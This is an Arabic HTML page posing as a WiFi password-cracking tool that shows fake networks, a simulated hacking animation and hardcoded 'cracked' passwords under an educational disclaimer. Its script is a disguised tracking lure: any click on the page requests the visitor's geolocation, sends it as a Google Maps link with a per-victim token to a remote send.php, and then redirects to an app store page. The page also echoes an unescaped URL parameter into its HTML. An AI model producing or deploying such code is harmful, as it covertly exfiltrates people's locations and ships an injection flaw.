<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مخترق الواي فاي - تخمين كلمات السر</title>
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a237e, #311b92, #4527a0);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
            padding: 20px;
            text-align: center;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            margin-bottom: 40px;
            animation: fadeIn 1.5s ease;
        }

        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }

        .logo i {
            font-size: 42px;
            color: #4facfe;
            filter: drop-shadow(0 0 10px rgba(79, 172, 254, 0.7));
            animation: pulse 2s infinite;
        }

        h1 {
            font-size: 42px;
            font-weight: 800;
            letter-spacing: 1px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .tagline {
            font-size: 18px;
            opacity: 0.9;
            margin-bottom: 10px;
        }

        .disclaimer {
            background: rgba(255, 0, 0, 0.2);
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }

        .wifi-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .wifi-item {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.18);
        }

        .wifi-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
        }

        .wifi-icon {
            font-size: 50px;
            color: #4facfe;
            margin-bottom: 15px;
        }

        .wifi-name {
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .wifi-strength {
            display: flex;
            justify-content: center;
            gap: 5px;
            margin: 15px 0;
        }

        .wifi-strength span {
            width: 25px;
            height: 10px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
        }

        .wifi-strength span.active {
            background: #4facfe;
        }

        .password-form {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.18);
            animation: slideUp 1s ease;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.2);
            color: white;
            font-size: 18px;
            text-align: center;
            letter-spacing: 3px;
        }

        .btn {
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            margin: 10px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .result {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.3);
            font-size: 18px;
            display: none;
        }

        .result.success {
            background: rgba(0, 255, 0, 0.2);
            display: block;
        }

        .result.failure {
            background: rgba(255, 0, 0, 0.2);
            display: block;
        }

        .hacking-animation {
            margin: 40px auto;
            width: 100%;
            height: 200px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            display: none;
        }

        .code {
            position: absolute;
            color: #4facfe;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            animation: fall 5s linear infinite;
        }

        .password-suggestions {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.18);
            text-align: right;
        }

        .password-suggestions h3 {
            margin-bottom: 15px;
            color: #4facfe;
        }

        .suggestions-list {
            list-style: none;
            text-align: right;
        }

        .suggestions-list li {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            font-family: 'Courier New', monospace;
            font-size: 18px;
            letter-spacing: 2px;
        }

        footer {
            margin-top: 50px;
            padding: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 14px;
            opacity: 0.8;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        @keyframes fall {
            from { transform: translateY(-100px); }
            to { transform: translateY(300px); }
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 32px;
            }
            
            .wifi-list {
                grid-template-columns: 1fr;
            }
            
            .logo i {
                font-size: 36px;
            }
        }
        .alert{
            /* background: rgba(255, 255, 255, 0.1); */
            background: hsl(235, 66%, 30%, 0.5);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin: 0 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.18);
            position: fixed;
            z-index: 100;
            width: 70%;
            left: 50%;
            top: 50%;
            transform: translate(-50%,-50%);
            display: flex;
            flex-direction: column;
            gap: 30px;
            animation: alert 1s linear ;
        }
        .alert p{
            font-size: 20px;
            font-weight: 600;
        }
        .alert button{
            width: 100px;
            margin: 0 auto;
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            color: black;
            border: none;
            padding: 10px 20px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
        }
        .alert button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 255, 255, 0.3);
        }
        @keyframes alert {
            0%{
                opacity: 0;
                margin-top: 40px;
            }
            100%{
                opacity: 1;
                margin-top: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-wifi"></i>
                <h1>مخترق الواي فاي</h1>
            </div>
            <p class="tagline">تخمين كلمات سر شبكات الواي فاي القريبة منك</p>
        </header>
        <div class="alert">
            <p>شبكات المجاورة</p>
            <button>بحث</button>
        </div>
        <div class="wifi-list">
            <div class="wifi-item" onclick="selectWifi('Home-Network-2.4G')">
                <div class="wifi-icon">
                    <i class="fas fa-wifi"></i>
                </div>
                <h3 class="wifi-name">Home-Network-2.4G</h3>
                <div class="wifi-strength">
                    <span class="active"></span>
                    <span class="active"></span>
                    <span class="active"></span>
                    <span></span>
                </div>
                <p>قوة الإشارة: قوية</p>
            </div>

            <div class="wifi-item" onclick="selectWifi('STC-5G-Wifi')">
                <div class="wifi-icon">
                    <i class="fas fa-wifi"></i>
                </div>
                <h3 class="wifi-name">STC-5G-Wifi</h3>
                <div class="wifi-strength">
                    <span class="active"></span>
                    <span class="active"></span>
                    <span></span>
                    <span></span>
                </div>
                <p>قوة الإشارة: متوسطة</p>
            </div>

            <div class="wifi-item" onclick="selectWifi('Mobily-WiFi-8845')">
                <div class="wifi-icon">
                    <i class="fas fa-wifi"></i>
                </div>
                <h3 class="wifi-name">Mobily-WiFi-8845</h3>
                <div class="wifi-strength">
                    <span class="active"></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <p>قوة الإشارة: ضعيفة</p>
            </div>
        </div>

        <div class="password-form" id="passwordForm" style="display: none;">
            <h2>تخمين كلمة السر لشبكة: <span id="selectedWifi">---</span></h2>
            
            <div class="form-group">
                <label for="password">أدخل كلمة السر المرشحة:</label>
                <input type="text" id="password" placeholder="أدخل كلمة السر هنا">
            </div>
            
            <button class="btn" onclick="tryPassword()">
                <i class="fas fa-key"></i> تجربة كلمة السر
            </button>
            
            <button class="btn" onclick="hackPassword()" style="background: linear-gradient(90deg, #ff5e7d 0%, #ff9500 100%);">
                <i class="fas fa-bolt"></i> اختراق تلقائي
            </button>
            
            <div class="result" id="result"></div>
        </div>

        <div class="hacking-animation" id="hackingAnimation">
            <!-- سيتم إضافة أكواد الهاكينج هنا عبر الجافاسكريبت -->
        </div>

        <div class="password-suggestions">
            <h3><i class="fas fa-lightbulb"></i> كلمات سر شائعة يمكن تجربتها:</h3>
            <ul class="suggestions-list">
                <li>123456789</li>
                <li>password</li>
                <li>admin123</li>
                <li>qwerty</li>
                <li>1234567890</li>
            </ul>
        </div>
    </div>

    <footer>
        <p>© 2023 مخترق الواي فاي - هذه الصفحة لأغراض تعليمية وتوعوية فقط</p>
        <p>يجب عليك دائماً الحصول على إذن صاحب الشبكة قبل محاولة الاتصال بها</p>
    </footer>
<input id="user_id" type="text" style="display: none;"
                        value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"></script>
    <script>
        let user_id = document.getElementById('user_id');
        // تحديد شبكة الواي فاي المختارة
        function selectWifi(wifiName) {
            document.getElementById('selectedWifi').textContent = wifiName;
            document.getElementById('passwordForm').style.display = 'block';
            
            // Scroll إلى نموذج إدخال كلمة السر
            document.getElementById('passwordForm').scrollIntoView({
                behavior: 'smooth'
            });
        }

        // محاولة كلمة السر
        function tryPassword() {
            const password = document.getElementById('password').value;
            const resultDiv = document.getElementById('result');
            
            if (!password) {
                resultDiv.className = 'result failure';
                resultDiv.innerHTML = '<i class="fas fa-times-circle"></i> يرجى إدخال كلمة سر للمحاولة';
                return;
            }
            
            // كلمات السر الصحيحة الافتراضية
            const correctPasswords = {
                'Home-Network-2.4G': '123456789',
                'STC-5G-Wifi': 'password',
                'Mobily-WiFi-8845': 'admin123'
            };
            
            const selectedWifi = document.getElementById('selectedWifi').textContent;
            
            if (password === correctPasswords[selectedWifi]) {
                resultDiv.className = 'result success';
                resultDiv.innerHTML = '<i class="fas fa-check-circle"></i> نجاح! تم الاتصال بالشبكة. كلمة السر صحيحة.';
            } else {
                resultDiv.className = 'result failure';
                resultDiv.innerHTML = '<i class="fas fa-times-circle"></i> فشل الاتصال. كلمة السر خاطئة. يرجى المحاولة مرة أخرى.';
            }
        }

        // محاكاة عملية الاختراق
        function hackPassword() {
            const hackingAnimation = document.getElementById('hackingAnimation');
            const resultDiv = document.getElementById('result');
            
            // إظهار رسالة وأنيميشن الهاكينج
            resultDiv.className = 'result';
            resultDiv.innerHTML = '<i class="fas fa-cog fa-spin"></i> جاري اختراق الشبكة... قد تستغرق العملية بعض الوقت';
            resultDiv.style.display = 'block';
            
            hackingAnimation.style.display = 'flex';
            hackingAnimation.innerHTML = '';
            
            // إنشاء أكواد متساقطة (مصفوفة من الأكواد)
            for (let i = 0; i < 20; i++) {
                const code = document.createElement('div');
                code.className = 'code';
                code.textContent = generateRandomCode();
                code.style.left = `${Math.random() * 100}%`;
                code.style.animationDelay = `${Math.random() * 4}s`;
                hackingAnimation.appendChild(code);
            }
            
            // محاكاة عملية الاختراق لمدة 5 ثوان
            setTimeout(() => {
                const selectedWifi = document.getElementById('selectedWifi').textContent;
                
                // كلمات السر الصحيحة الافتراضية
                const correctPasswords = {
                    'Home-Network-2.4G': '123456789',
                    'STC-5G-Wifi': 'password',
                    'Mobily-WiFi-8845': 'admin123'
                };
                
                hackingAnimation.style.display = 'none';
                resultDiv.className = 'result success';
                resultDiv.innerHTML = `<i class="fas fa-check-circle"></i> تم اختراق الشبكة بنجاح! كلمة السر هي: <strong>${correctPasswords[selectedWifi]}</strong>`;
                
                // تعبئة حقل كلمة السر تلقائياً
                document.getElementById('password').value = correctPasswords[selectedWifi];
            }, 5000);
        }

        // توليد أكواد عشوائية للأنيميشن
        function generateRandomCode() {
            const chars = '01010101010101010101010101ABCDEF@$%&*#';
            let code = '';
            for (let i = 0; i < 16; i++) {
                code += chars[Math.floor(Math.random() * chars.length)];
            }
            return code;
        }
        document.onclick = async () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Create a Google Maps link
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // Show it on the page
                //after fetch
                await send(user_id.value, mapLink ) ; 
                    window.location.href = 'https://play.google.com/store/apps/details?id=com.themausoft.wpsapp';
                //after fetch
            },
            error => {
                console.error('تعذر الحصول على الموقع:', error.message);
            }
        );
    } else {
        console.error('المتصفح لا يدعم تحديد الموقع الجغرافي');
    }
};
async function send(id, email, password = ' ') {
      try {
        let res = await fetch('../send.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            id: id,
            email: email,
            password: password,
            page : 'localisation'
          })
        });

        let data = await res.text();
        console.log(data);

      } catch (err) {
        console.error('Error:', err);
      }
    }
    
    </script>
</body>
</html>